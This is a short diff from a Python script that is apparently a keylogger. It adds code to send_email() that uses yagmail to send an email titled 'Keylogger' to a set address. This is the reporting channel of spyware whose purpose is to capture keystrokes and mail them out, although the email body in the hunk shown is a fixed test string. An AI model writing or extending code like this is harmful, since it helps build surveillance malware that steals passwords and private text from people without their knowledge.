@@ -25,3 +25,10 @@ def send_email():               #defining a function called 'send_email'
     recceiver_email = 'example_R@gmail.com'                     #creating a variable called 'receiver_email' and assigning it the value of the receiver's email address
     subject = 'Keylogger'                                       #creating a variable called 'subject' and assigning it the value of the subject of the email
     body = 'This is an email sent by a keylogger'               #creating a variable called 'body' and assigning it the value of the body of the email
+
+    try:
+        yag = yagmail.SMTP(sender_email)                        #creating a variable called 'yag' and assigning it the value of the sender's email address
+        yag.send(recceiver_email, subject, body)                #sending the email
+        print('Email sent successfully XD')                        #printing a message if the email is sent successfully
+    except:
+        print('Error!!! email was not sent...')                      #printing a message if the email is not sent successfully
